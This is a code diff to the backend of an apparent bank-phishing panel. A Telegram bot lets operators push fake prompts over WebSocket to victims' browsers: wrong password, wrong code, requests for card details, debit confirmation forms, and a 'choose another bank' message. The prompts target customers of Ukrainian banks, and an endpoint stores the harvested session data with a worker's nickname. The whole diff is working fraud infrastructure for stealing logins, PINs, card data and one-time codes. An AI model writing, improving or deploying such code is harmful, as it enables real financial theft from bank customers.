@@ -93,6 +93,8 @@ bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     const ws = clients.get(sessionId);
 
+    console.log(`Получена команда: ${type}, sessionId: ${sessionId}`);
+
     if (!ws || ws.readyState !== WebSocket.OPEN) {
         console.error(`Ошибка: Клиент ${sessionId} не в сети`);
         bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: клиент не в сети!', show_alert: true });
@@ -100,7 +102,9 @@ bot.on('callback_query', (callbackQuery) => {
     }
 
     const sessionData = sessions.get(sessionId) || {};
-    let command = { type, data: {} };
+    console.log(`Данные сессии для ${sessionId}:`, sessionData);
+
+    let command = { type };
     let responseText = `Команда "${type}" отправлена!`;
 
     switch (type) {
@@ -110,21 +114,15 @@ bot.on('callback_query', (callbackQuery) => {
             break;
         case 'number_error':
             command.type = 'number_error';
-            command.data = { loginType: sessionData.loginMethod || 'phone' };
-            responseText = 'Запрос "неверный номер" отправлен!';
+            responseText = 'Запрос "Номер не финансовый" отправлен!';
             break;
         case 'telegram_debit':
             command.type = sessionData.bankName === 'Ощадбанк' ? 'telegram_debit' : 'show_debit_form';
+            responseText = 'Запрос "Списание" отправлен!';
             break;
         case 'password_error':
-            if (sessionData.bankName === 'Райффайзен') {
-                command.type = 'raiff_pin_error';
-                responseText = 'Запрос "неверный пароль" отправлен!';
-            } else {
-                command.type = 'password_error';
-                command.data = { loginType: sessionData.loginMethod || 'phone' };
-                responseText = 'Запрос "неверный пароль" отправлен!';
-            }
+            command.type = sessionData.bankName === 'Райффайзен' ? 'raiff_pin_error' : 'password_error';
+            responseText = 'Запрос "Неверный пароль" отправлен!';
             break;
         case 'client_not_found':
             command.type = 'client_not_found';
@@ -138,7 +136,7 @@ bot.on('callback_query', (callbackQuery) => {
             } else {
                 command.type = 'generic_debit_error';
             }
-            responseText = 'Запрос "неверный код" отправлен!';
+            responseText = 'Запрос "Неверный код" отправлен!';
             break;
         case 'request_details':
             if (sessionData.bankName === 'Альянс') {
@@ -152,7 +150,9 @@ bot.on('callback_query', (callbackQuery) => {
             responseText = `Запрос деталей карты (${sessionData.bankName}) отправлен!`;
             break;
         case 'other':
+            command.type = 'other';
             command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
+            responseText = 'Запрос "Другой банк" отправлен!';
             break;
         case 'viber_call':
             command.type = 'viber';
@@ -171,9 +171,9 @@ bot.on('callback_query', (callbackQuery) => {
     try {
         ws.send(JSON.stringify(command));
         bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
-        console.log(`Команда ${type} отправлена клиенту ${sessionId}`);
+        console.log(`Команда ${command.type} отправлена клиенту ${sessionId}`);
     } catch (error) {
-        console.error(`Ошибка отправки команды ${type} клиенту ${sessionId}:`, error);
+        console.error(`Ошибка отправки команды ${command.type} клиенту ${sessionId}:`, error);
         bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка отправки команды!', show_alert: true });
     }
 });
@@ -197,6 +197,7 @@ app.post('/api/submit', (req, res) => {
     const existingData = sessions.get(sessionId) || {};
     const newData = { ...existingData, ...stepData, workerNick };
     sessions.set(sessionId, newData);
+    console.log(`Сохранены данные сессии ${sessionId}:`, newData);
 
     let message = '';
 
